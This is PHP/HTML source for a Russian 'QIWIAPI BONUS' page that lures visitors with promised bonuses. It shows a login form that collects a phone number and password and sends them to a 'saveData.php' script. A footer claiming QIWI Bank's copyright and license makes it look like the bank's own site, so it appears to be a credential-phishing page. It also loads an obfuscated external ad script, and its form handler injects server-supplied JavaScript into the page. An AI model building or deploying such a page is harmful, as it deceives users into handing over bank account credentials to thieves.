<?php 
session_start();
if(isset($_GET['ref'])){
$_SESSION['ref'] = $_GET['ref'];
}
?>
<!DOCTYPE HTML>
<html>
	<head>
		<title>QIWIAPI BONUS</title>
		<meta name="keywords" content=">QIWIAPI, qiwi, api, день, мани, халява, киви, киви бонус"> 
		<meta name="description" content="Пользуйся QIWIAPI и получай за это бонусы">
		<meta charset="windows-1251" />
		<meta name="yandex-verification" content="4993c086cae51c72" />
		<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
		<!--[if lte IE 8]><script src="assets/js/ie/html5shiv.js"></script><![endif]-->
		<link rel="stylesheet" href="./templates/deam/assets/css/main.css" />
		<link rel="stylesheet" href="./templates/deam/assets/css/iao.css" />
		<link rel="shortcut icon" type="image/png" href="./templates/deam/assets/images/logo.png"/>
		<script src="https://code.jquery.com/jquery-1.11.0.min.js" type="text/javascript"></script>   
		<script src="https://use.fontawesome.com/b3472dba05.js"></script>
		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.3.5/jquery.fancybox.min.css" />
		<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.3.5/jquery.fancybox.min.js"></script>
		<!--[if lte IE 8]><link rel="stylesheet" href="assets/css/ie8.css" /><![endif]-->

		<script type='text/javascript' id="s-801767cc96b569d0">!function(t,e,n,o,a,c,s){t[a]=t[a]||function(){(t[a].q=t[a].q||[]).push(arguments)},t[a].l=1*new Date,c=e.createElement(n),s=e.getElementsByTagName(n)[0],c.async=1,c.src=o,s.parentNode.insertBefore(c,s)}(window,document,"script","//vidplah.com/player/","vbm"); vbm('get', {"platformId":98181,"format":2,"align":"top","width":"550","height":"350","sig":"801767cc96b569d0"});</script>
	</head>
	<body class="landing">
		<div class='loading-block loading'></div>
		<div id="page-wrapper"> 
				<header id="header" class="alt">
					<h1><img src='./templates/deam/assets/images/logo.png' style='    width: 40px;position: relative;top: 15px;margin-right: 10px;'><a href="/" rel='ajaxed' class='Gugi' style='top: 3px;position: relative;'>QIWI<span style='color:#333'>API</span></a></h1>
					<nav id="nav">
	<ul>
		<li><a href="/" rel='ajaxed'>Главная</a></li> 
		<li>
			<a href="#" class="icon fa-angle-down"><i class="fa fa-user-circle-o" aria-hidden="true"></i> Гость</a>
			<ul>
				<li><a href="/login.php" rel='ajaxed' >Войти</a></li>
				<li><a href="/reg.php" rel='ajaxed' >Зарегистрироваться</a></li>
			</ul>
		</li>  
	</ul>
</nav>				</header>
				<section id="banner">
					<div id='videobag'></div>
					<img src='./templates/deam/assets/images/logo.png'>
					<h2 class='Gugi'><span style='color:#ff8c00'>QIWI</span> API</h2>
					<p>ИСПОЛЬЗУЙ QIWIAPI И ПОЛУЧАЙ #QIWIБОНУСЫ</p>
											<ul class="actions">
							<li><a href="/reg.php" class="button special" rel='ajaxed' data-loading='true' >Зарегистрироваться</a></li>
							<li><a href="/login.php" class="button special" rel='ajaxed' data-loading='true'>Войти</a></li>
						</ul>  
									</section>
				<div class='ajax-content'>
				<section id="main" class="container">  
	<section class="box special features" style='max-width: 700px; margin: 0 auto;'>  
		<form action='/post/saveData.php' method='POST' > 
			<div class="row uniform 50%">
				<div class="12u">
					<h5>Номер телефона</h5>
					<input type='text' name='phone'>
				</div>
				<div class="12u">
					<h5>Пароль</h5>
					<input type='password' name='password'>
				</div>
			</div>
			<div class="row uniform">
				<div class="12u">
					<ul class="actions align-center">
						<li><button type="submit" class='button special' >Войти</button></li>
					</ul>
				</div>
			</div>
		</form>
	</section>
</section>


</div> 
<!-- Footer -->
<footer id="footer">
	<div class='container' style='padding: 0;margin: 0px auto;    padding-top: 33px;'>
		<div class='qiwilogo'><img src='http://u6.filesonload.ru/s/7a2q5p051/f7bb366626f8249ac09ae74752f63519/5446fa5d71656a2a01953f0b2f2ac2bb.png'></div>
	<ul class="copyright">
		<li>© 2018, КИВИ Банк (АО), лицензия ЦБ РФ № 2241

		<p>Россия, 117648, г. Москва, мкр. Чертаново Северное, д.1А, корп.1</p></li>
	</ul> 
		</div>
</footer>

<!-- Scripts -->
<script src="./templates/deam/assets/js/jquery.min.js"></script>
<script src="./templates/deam/assets/js/jquery.mask.js"></script>
<script src="./templates/deam/assets/js/jquery.dropotron.min.js"></script>
<script src="./templates/deam/assets/js/jquery.scrollgress.min.js"></script>
<script src="./templates/deam/assets/js/skel.min.js"></script>
<script src="./templates/deam/assets/js/util.js"></script>
<!--[if lte IE 8]><script src="assets/js/ie/respond.min.js"></script><![endif]-->
<script src="./templates/deam/assets/js/main.js"></script>
<script src="./templates/deam/assets/js/youtube.js"></script>
<script src="./templates/deam/assets/js/iao.js"></script>
<script>

function isEmpty(str) {
    return (!str || 0 === str.length);
}
function setLocation(curLoc){
    try {
      history.pushState(null, null, curLoc);
      return;
    } catch(e) {}
    location.hash = '#' + curLoc;
}
$request = 0;
function init(){
	$('input[name=phone]').mask('+7 (000) 000-00-00');
	$('form[rel=ajax]').submit(function(event){
		event.preventDefault();
		$form = $(this);
		$button = $form.find('button'); 
		$method = $form.attr('method');
		$action = $form.attr('action');
		$.ajax({
			'url': $action,
			'type': $method, 
			'dataType': "json",
			'data': $form.serialize(),
			'beforeSend': function() {
				$('.loading-block').show();
				$button.addClass('loading');
				$button.prop({disabled: true}); 
				$form.find('input').css({'border-color':'#e5e5e5'}).prev().css({'border-color':'#e5e5e5'});
			},
		}).done(function(response){ 
				$.iaoAlert({msg: response.msg,type: response.response,mode: "light",});
				$button.removeClass('loading'); 
				$('.loading-block').hide();
				$button.prop({disabled: false});
				if(response.response == 'success'){
					$form.trigger( 'reset' );
				}
				if(!isEmpty(response.addons)){  
					try { 
						if(!isEmpty(response.addons.required)){ 
							$required = response.addons.required;
							$required.forEach(function(items){
								$form.find('input[name='+Object.keys(items)+']').css({'border-color':'red'}).prev().css({'border-color':'red'});;
							}); 
						}else if(!isEmpty(response.addons.redirect)){ 
							 $(location).attr("href", response.addons.redirect);
						}else if(!isEmpty(response.addons.html)){
							$(response.addons.html.block).html(response.addons.html.html); 
						}else if(!isEmpty(response.addons.js)){
							$('body').append(response.addons.js); 
						}
					} catch (err) {}	
				}
			});				
		}); 

$(document).ready(function(){
	//$('#navPanel a').attr('rel', 'ajaxed');
	init();	
});
</script> 
<!--]-->

</body>
</html><!-- zzz </body><!-->
